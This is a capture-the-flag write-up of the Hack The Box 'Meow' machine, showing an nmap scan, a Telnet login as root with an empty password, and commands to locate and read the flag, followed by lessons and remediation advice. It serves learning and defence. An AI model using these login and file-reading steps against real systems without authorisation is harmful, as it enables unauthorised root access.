# HTB - Meow

**Platform:** Hack The Box — Starting Point, Tier 0  
**OS:** Linux  
**Difficulty:** Very Easy  
**Status:** Pwned ✅

---

## Summary

Meow is a beginner-friendly Linux machine from HTB Starting Point. The goal is to practice basic enumeration and understand how misconfigured services can expose a system. In this case, a Telnet service was running with no password set on the root account.

---

## Tools Used

- `nmap` — port scanning and service enumeration
- `telnet` — remote connection to the target

---

## Steps

### 1. Port Scanning

```bash
nmap -sV 10.129.1.17
```

The scan revealed a single open port:

```
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
```

Only Telnet is exposed. This is already a red flag — Telnet is an unencrypted, legacy protocol that should never be used in production.

### 2. Telnet Login

Tried connecting via Telnet and logging in as `root` with no password:

```bash
telnet 10.129.1.17
```

```
Meow login: root
Password: [empty]
```

Login successful. The root account had no password set, giving immediate full access to the system.

### 3. Finding the Flag

```bash
find / -name flag.txt 2>/dev/null
```

Output:
```
/root/flag.txt
```

```bash
cat /root/flag.txt
```

```
b40abfde23665f766f9c61ecba8a4c19
```

---

## What I Learned

- How to use `nmap -sV` to identify running services on a target
- Telnet is inherently insecure — it transmits data in cleartext and should be replaced by SSH
- Default or empty credentials are one of the most common misconfigurations found in real environments
- Even a "very easy" machine reflects real-world issues: exposed management services with no authentication

---

## Remediation

- Disable Telnet and use SSH instead
- Always set strong passwords on all system accounts, especially root
- Firewall management ports so they are not publicly accessible
